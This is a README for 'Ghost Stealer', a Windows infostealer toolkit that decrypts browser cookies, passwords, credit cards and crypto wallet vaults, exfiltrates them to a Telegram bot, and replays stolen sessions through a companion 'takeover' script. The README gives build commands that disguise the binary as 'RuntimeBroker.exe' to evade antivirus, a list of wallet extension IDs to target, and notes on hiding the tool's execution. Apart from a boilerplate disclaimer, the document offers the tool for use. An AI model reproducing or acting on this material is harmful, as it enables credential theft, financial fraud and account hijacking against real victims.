# 👻 Ghost Stealer

**Full-spectrum browser data extraction and session hijacking toolkit.**

Ghost Stealer silently discovers, decrypts, and exfiltrates browser data from Windows systems — cookies, passwords, credit cards, autofill, browsing history, bookmarks, and crypto wallet vaults. It covers 45+ Chromium variants and 10+ Gecko browsers, handles every encryption scheme from legacy DPAPI through Chrome's latest App-Bound Encryption (v20), and ships the data to Telegram as a structured archive. Its companion tool, **Ghost Takeover**, imports stolen sessions into any Chromium browser with user agent spoofing — regardless of which browser the data was stolen from.

> ⚠️ **Authorized security research, penetration testing, and education only.** Unauthorized access to systems or data is illegal. The authors assume no liability for misuse.

---

## ✨ Features

### Extraction (`ghost.py`)

- **Universal Cookie Decryption** — cascading fallback: `v10/v11 AES-GCM` → `v20 Flag 1 AES` → `v20 Flag 2 ChaCha20` → `v20 Flag 3 CNG/KSP` → `raw DPAPI`
- **Saved Passwords** — decrypts credentials from `Login Data` using the same master key pipeline
- **Credit Cards** — decrypts card numbers from `Web Data`, captures cardholder name and expiry
- **Autofill Data** — form field names, values, usage counts
- **Browsing History** — URLs, titles, visit counts, timestamps
- **Download History** — file paths, source URLs, sizes, MIME types
- **Bookmarks** — full recursive tree from `Bookmarks` JSON
- **Crypto Wallet Vaults** — scans 30+ wallet extension IDs, extracts encrypted vault blobs from LevelDB
- **User Agent Capture** — reads browser PE version info, constructs exact UA strings
- **45+ Chromium Browsers** — Chrome, Edge, Brave, Vivaldi, Yandex, Opera, Opera GX, and more
- **10+ Gecko Browsers** — Firefox, Waterfox, LibreWolf, Pale Moon, Basilisk, Floorp, Mullvad, Zen, Mercury
- **Three-Layer Discovery** — known paths → Windows Registry → filesystem sweep
- **Multi-User Extraction** — enumerates all user profiles via registry + `C:\Users` scan
- **Three-Phase Key Extraction** — all v10 keys first, then v20, preventing token corruption
- **Silent Execution** — zero console windows via Win32 API (`CopyFileW`, `TerminateProcess`, `SW_HIDE`)
- **Zero Disk Footprint** — ZIP built in `io.BytesIO`, exfiltrated via Telegram

### Session Hijack (`takeover.py`)

- **Cross-Browser Import** — cookies from any source browser work in any target browser. Stole Yandex cookies but only have Chrome? Works perfectly
- **Auto-Detection** — if no browser specified, detects installed browsers and asks you to choose
- **CDP Cookie Injection** — injects all cookies via `Network.setCookie` before any navigation
- **User Agent Spoofing** — `Network.setUserAgentOverride` with victim's exact UA string
- **Manual Navigation** — browser opens to blank page, you navigate when ready (avoids triggering server-side session checks)
- **Password Display** — shows all extracted credentials inline
- **Credit Card Display** — shows card numbers, names, expiry
- **Wallet Vault Info** — lists extracted wallet vaults

---

## 🔐 Encryption Support

### Pre-ABE (v10/v11)

Master key from `Local State` → `os_crypt.encrypted_key` → Base64 → strip DPAPI header → `CryptUnprotectData`. Universal across all Chromium. Cookies, passwords, card numbers all AES-256-GCM.

### App-Bound Encryption (v20)

Double DPAPI unwrap (SYSTEM via LSASS, then USER), flag-dependent derivation:

| Flag | Chrome Version | Algorithm | Key Source |
|------|---------------|-----------|------------|
| `1`  | 127 – 132     | AES-256-GCM | Hardcoded in `elevation_service.exe` |
| `2`  | 133 – 136     | ChaCha20-Poly1305 | Hardcoded in `elevation_service.exe` |
| `3`  | 137+          | AES-256-GCM | CNG Key Storage Provider + XOR |
| `135` | 137+ (alt)   | AES-256-GCM | Same as flag 3 |

### Browser-Specific Handling

- **Brave v20** — sometimes omits 32-byte metadata header. Handled automatically
- **Yandex v10** — prepends 32 bytes of binary metadata. Handled automatically
- **Opera / Opera GX** — never adopted ABE. Pure DPAPI fallback
- **Non-Chrome forks** — simplified ABE fallback extracts raw key

---

## 🪙 Crypto Wallet Extraction

Scans `Local Extension Settings` for 30+ wallet extension IDs. Extracts encrypted vault data from raw LevelDB files without external dependencies.

<details>
<summary>Supported Wallets (30+)</summary>

| Wallet | Extension ID |
|--------|-------------|
| MetaMask | `nkbihfbeogaeaoehlefnkodbefgpgknn` |
| Coinbase Wallet | `hnfanknocfeofbddgcijnmhnfnkdnaad` |
| Phantom | `bfnaelmomeimhlpmgjnjophhpkkoljpa` |
| TronLink | `ibnejdfjmmkpcnlpebklmnkoeoihofec` |
| Trust Wallet | `egjidjbpglichdcondbcbdnbeeppgdph` |
| OKX Wallet | `mcohilncbfahbmgdjkbpemcciiolgcge` |
| Keplr | `dmkamcknogkgcdfhhbddcghachkejeap` |
| BNB Chain | `fhbohimaelbohpjbbldcngcnapndodjp` |
| Braavos | `jnlgamecbpmbajjfhmmmlhejkemejdma` |
| Math Wallet | `afbcbjpbpfadlkmhmclhkeeodmamcflc` |
| Ronin | `fnjhmkhhmkbjkkabndcnnogagogbneec` |
| Exodus | `aholpfdialjgjfhomihkjbmgjidlcdno` |
| Rabby | `acmacodkjbdgmoleebolmdjonilkdbch` |
| TokenPocket | `mfgccjchihfkkindfppnaooecgfneiii` |
| Bitget | `jiidiaalihmmhddjgbnbgdffknnlceai` |
| Sui Wallet | `opcgpfmipidbgpenhmajoajpbobppdil` |
| Leap | `fcfcfllfndlomdhbehjjcoimbgofdncg` |
| Station | `aiifbnbfobpmeekipheeijimdpnlpgpp` |
| Coin98 | `aeachknmefphepccionboohckonoeemg` |
| XDEFI | `hmeobnfnfcmdkdcmlblgagmfpfboieaf` |
| Clover | `nhnkbkgjikgcigadomkphalanndcapjk` |
| Yoroi | `ffnbelfdoeiohenkjibnmadjiehjhajb` |
| Solflare | `bhhhlbepdkbapadjdcodbhkbmljfand` |
| Brave Wallet | `odbfpeeihdkbihmopkbjmoonfanlbfcl` |

</details>

Vault data exported as encrypted JSON. Decryption requires wallet password (PBKDF2 + AES-GCM). Bruteforceable offline.

---

## 🌐 Supported Browsers

### Chromium-Based (45+)

<details>
<summary>Click to expand</summary>

| Browser | Scope | Path |
|---------|-------|------|
| Chrome | LOCAL | `Google\Chrome\User Data` |
| Chrome Beta | LOCAL | `Google\Chrome Beta\User Data` |
| Chrome Canary | LOCAL | `Google\Chrome SxS\User Data` |
| Edge | LOCAL | `Microsoft\Edge\User Data` |
| Edge Beta | LOCAL | `Microsoft\Edge Beta\User Data` |
| Brave | LOCAL | `BraveSoftware\Brave-Browser\User Data` |
| Brave Beta | LOCAL | `BraveSoftware\Brave-Browser-Beta\User Data` |
| Vivaldi | LOCAL | `Vivaldi\User Data` |
| Yandex | LOCAL | `Yandex\YandexBrowser\User Data` |
| Opera | ROAMING | `Opera Software\Opera Stable` |
| Opera GX | ROAMING | `Opera Software\Opera GX Stable` |
| Iridium | LOCAL | `Iridium\User Data` |
| Chromium | LOCAL | `Chromium\User Data` |
| CentBrowser | LOCAL | `CentBrowser\User Data` |
| Naver Whale | LOCAL | `Naver\Naver Whale\User Data` |
| Avast Browser | LOCAL | `AVAST Software\Browser\User Data` |
| AVG Browser | LOCAL | `AVG\Browser\User Data` |
| + 28 more discovered via registry + filesystem scan | | |

</details>

### Gecko-Based (10+)

Firefox, Waterfox, LibreWolf, Pale Moon, Basilisk, IceDragon, Floorp, Mullvad, Zen, Mercury

---

## 🏗️ Architecture

```
GhostExtractor
├── ProcessKiller (Win32 TerminateProcess — silent)
├── PathDiscovery (known paths + registry + filesystem)
├── ChromiumExtractor (three-phase)
│   ├── MasterKeyExtractor (v10 + v20 + CNG)
│   ├── CookieDecryptor → _decode_value
│   ├── Passwords (Login Data)
│   └── DataExtractor
│       ├── Credit Cards (Web Data)
│       ├── Autofill (Web Data)
│       ├── History + Downloads (History)
│       ├── Bookmarks (JSON)
│       └── Wallet Vaults (LevelDB scan)
├── GeckoExtractor (moz_cookies)
├── UserAgentExtractor (PE version → UA)
└── Exfiltrator (in-memory ZIP → Telegram)

Ghost Takeover
├── Auto-detect installed browsers
├── Load all data from zip (any source browser)
├── UA spoofing (Network.setUserAgentOverride)
├── Cookie injection (Network.setCookie)
├── Display passwords, cards, wallets
└── Open browser to blank page (manual navigation)
```

---

## 🚀 Usage

### Extraction

```python
TG_TOKEN   = 'your_bot_token'
TG_CHAT_ID = your_chat_id
```

```powershell
python ghost.py    # auto-elevates via UAC, runs silently
```

### Build

```powershell
# PyInstaller
py -m PyInstaller --onefile --noconsole --clean --name RuntimeBroker ghost.py

# Nuitka (lower AV detection)
nuitka --onefile --windows-console-mode=disable --output-filename=RuntimeBroker.exe ghost.py
```

### Session Takeover

```powershell
# Auto-detect browser — asks you to choose
python takeover.py victim_data.zip

# Specify browser
python takeover.py victim_data.zip chrome
python takeover.py victim_data.zip brave
python takeover.py victim_data.zip edge

# Specific profile
python takeover.py victim_data.zip chrome "Profile 1"
```

Cross-browser import works. Stole cookies from Yandex + Brave + Edge but only have Chrome installed? All cookies merge and inject into Chrome. Once decrypted, cookies are just `domain + name + value` — any Chromium browser accepts them.

---

## 📦 Output

### Telegram

```
👤 User
📅 2026/05/02 18:30:00
🍪 1789 cookies
🔑 23 passwords
💳 2 cards
🪙 1 wallets
🌐 4 browsers
```

### ZIP

```
victim_data.zip
├── chrome/
│   ├── cookies.json          # Cookie-Editor format
│   ├── .google.com.txt       # Legacy format
│   ├── passwords.txt / .json
│   ├── credit_cards.txt / .json
│   ├── autofill.txt / .json
│   ├── history.txt / .json
│   ├── downloads.txt
│   ├── bookmarks.txt / .json
│   ├── wallets.json
│   └── wallet_metamask_vault.json
├── brave/
├── firefox/
└── user_agents.json
```

---

## 📋 Requirements

### Extractor

```
pip install pycryptodome pywin32 cryptography requests PythonForWindows
```

### Takeover

```
pip install websocket-client requests
```

---

## 🛡️ Stealth

- **No `os.system()` calls** — `CopyFileW` for file copies, `TerminateProcess` for kills
- **Zero console windows** — all operations via Win32 API with `CREATE_NO_WINDOW`
- **SW_HIDE elevation** — UAC prompts but script window stays invisible
- **In-memory ZIP** — nothing written to disk except temp DB copies (cleaned immediately)
- **No LevelDB dependencies** — raw file scanning for wallet vaults

---

## ⚠️ Disclaimer

**Authorized security testing and education only.** Unauthorized use is illegal. Authors assume no liability.

## 📄 License

MIT
